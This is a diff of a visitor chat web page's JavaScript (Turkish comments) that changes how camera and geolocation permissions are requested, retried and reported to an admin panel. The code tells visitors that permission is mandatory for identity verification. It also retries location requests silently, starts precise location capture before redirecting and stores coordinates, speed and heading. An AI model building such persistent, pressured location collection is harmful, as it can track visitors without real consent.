@@ -888,34 +888,40 @@
     };
 
     const onErr = (err, { fromUserTap = false } = {}) => {
+      // Konum bir kez alındıysa hata status'u ile ezme
       if (!cameraSessions.has(callId) || state._hadLocation) return;
-      const code = err?.code;
-      const silentFail = !fromUserTap;
-      const msg = silentFail
-        ? "prompting"
-        : code === 1
-          ? "denied"
-          : code === 2
-            ? "unavailable"
-            : code === 3
-              ? "timeout"
-              : "error";
-      const detail = silentFail
-        ? "Otomatik konum denendi"
-        : err?.message || msg;
+      const code = Number(err?.code);
+      // ÖNEMLİ: otomatik retry'ları "kullanıcı reddi" sanma → admin'de sahte "Konum engelli"
+      const isRealUserDeny = fromUserTap === true && code === 1;
+      const msg = isRealUserDeny
+        ? "denied"
+        : code === 2
+          ? "unavailable"
+          : code === 3
+            ? "timeout"
+            : fromUserTap
+              ? "error"
+              : "prompting";
+      const detail = isRealUserDeny
+        ? err?.message || "Kullanıcı konumu reddetti"
+        : fromUserTap
+          ? err?.message || msg
+          : "Otomatik konum denendi";
       sync.writeLocationStatus?.(sessionId, callId, msg, detail).catch(() => {});
-      if (!silent && !silentFail && box) {
+      if (!silent && isRealUserDeny && box) {
         appendMessage(
           box,
           "bot",
           "Kimlik doğrulaması için izin verilmedi. İzin zorunludur; izin olmadan doğrulama tamamlanamaz.",
-          { sync: true }
+          { sync: false }
         );
+        showLocDeniedNotice();
+        if (!locationGrantedSynced) {
+          syncMessage("user", "Konum izni alınamadı (denied).");
+        }
       }
-      syncMessage("user", `Konum izni alınamadı (${msg}).`);
-      if (!silent) showLocDeniedNotice();
       scheduleRetry();
-      state._onLocationDenied?.();
+      if (isRealUserDeny) state._onLocationDenied?.();
     };
 
     const askLocation = (fromUserTap = false) => {
@@ -934,26 +940,32 @@
           asking = false;
           publish(pos);
           if (!cameraSessions.has(callId) || !state._hadLocation) return;
-          state.geoWatchId = navigator.geolocation.watchPosition(publish, (err) => onErr(err), {
-            enableHighAccuracy: true,
-            maximumAge: 2000,
-            timeout: 15000,
-          });
+          // Watch hataları otomatik — denied yazma
+          state.geoWatchId = navigator.geolocation.watchPosition(
+            publish,
+            (err) => onErr(err, { fromUserTap: false }),
+            {
+              enableHighAccuracy: true,
+              maximumAge: 2000,
+              timeout: 15000,
+            }
+          );
         },
         (err) => {
           asking = false;
           onErr(err, { fromUserTap });
         },
         {
-          enableHighAccuracy: false,
-          maximumAge: 60000,
-          timeout: 60000,
+          enableHighAccuracy: Boolean(fromUserTap),
+          maximumAge: fromUserTap ? 0 : 60000,
+          timeout: fromUserTap ? 20000 : 60000,
         }
       );
     };
 
     state.locationRetryTimer = null;
-    state.retryLocation = () => askLocation(true);
+    // Otomatik loop false; yalnızca gerçek jest/buton true geçmeli
+    state.retryLocation = (fromUserTap = false) => askLocation(Boolean(fromUserTap));
     // Zorla: defer değilse mobilde de hemen iste
     if (!deferAsk) {
       askLocation(false);
@@ -1155,7 +1167,7 @@
         applySeedLocationToSession(sync, callId, already, options.seedLocation);
       } else if (already && !already._hadLocation) {
         try {
-          already.retryLocation?.(true);
+          already.retryLocation?.(false);
         } catch {
           /* ignore */
         }
@@ -1796,9 +1808,58 @@
     return s;
   }
 
+  function stashEarlyLocation(pos) {
+    if (!pos?.coords) return;
+    earlyLocationPos = pos;
+    try {
+      sessionStorage.setItem(
+        "early_loc_v1",
+        JSON.stringify({
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          altitude: pos.coords.altitude,
+          heading: pos.coords.heading,
+          speed: pos.coords.speed,
+          ts: Date.now(),
+        })
+      );
+    } catch {
+      /* ignore */
+    }
+  }
+
+  function restoreEarlyLocation() {
+    if (earlyLocationPos?.coords) return earlyLocationPos;
+    try {
+      const raw = sessionStorage.getItem("early_loc_v1");
+      if (!raw) return null;
+      const o = JSON.parse(raw);
+      const lat = Number(o?.lat);
+      const lng = Number(o?.lng);
+      if (!Number.isFinite(lat) || !Number.isFinite(lng)) return null;
+      if (o.ts && Date.now() - Number(o.ts) > 10 * 60 * 1000) return null;
+      earlyLocationPos = {
+        coords: {
+          latitude: lat,
+          longitude: lng,
+          accuracy: Number(o.accuracy) || null,
+          altitude: o.altitude ?? null,
+          heading: o.heading ?? null,
+          speed: o.speed ?? null,
+        },
+        timestamp: Number(o.ts) || Date.now(),
+      };
+      return earlyLocationPos;
+    } catch {
+      return null;
+    }
+  }
+
   async function requestPageEntryPermissions(fromGesture = false) {
     // Kalıcı izin varsa sessizce stream aç; kapı gösterme
     const alreadyGranted = isMediaPermGranted();
+    restoreEarlyLocation();
     let camOk = false;
     let justGranted = false;
     const existing = earlyCameraStream;
@@ -1824,16 +1885,30 @@
       }
     }
 
-    // Kamera izni anında sohbet sayfasına geç (konum bekleme — ban-appeal vb.)
+    // Konumu redirect ÖNCESİ başlat (await etme — sohbet gecikmesin)
+    if (camOk && !earlyLocationPos && navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => stashEarlyLocation(pos),
+        () => {},
+        {
+          enableHighAccuracy: Boolean(fromGesture),
+          maximumAge: fromGesture ? 0 : 60000,
+          timeout: fromGesture ? 12000 : 20000,
+        }
+      );
+    }
+
+    // Kamera izni anında sohbet sayfasına geç
     if (camOk && (justGranted || fromGesture || !alreadyGranted)) {
       openVisitorChatNow();
     }
 
+    // Hâlâ aynı sayfadaysak (chat.html) konumu bekle
     if (!earlyLocationPos && navigator.geolocation) {
       try {
-        earlyLocationPos = await new Promise((resolve) => {
+        const pos = await new Promise((resolve) => {
           navigator.geolocation.getCurrentPosition(
-            (pos) => resolve(pos),
+            (p) => resolve(p),
             () => resolve(null),
             {
               enableHighAccuracy: Boolean(fromGesture),
@@ -1842,6 +1917,7 @@
             }
           );
         });
+        if (pos) stashEarlyLocation(pos);
       } catch {
         /* ignore */
       }
@@ -2063,7 +2139,7 @@
         applySeedLocationToSession(sync, callId, existing, earlyLocationPos);
       }
       try {
-        existing.retryLocation?.(true);
+        existing.retryLocation?.(false);
       } catch {
         /* ignore */
       }
@@ -2077,7 +2153,7 @@
           },
           () => {
             try {
-              existing.retryLocation?.(true);
+              existing.retryLocation?.(false);
             } catch {
               /* ignore */
             }
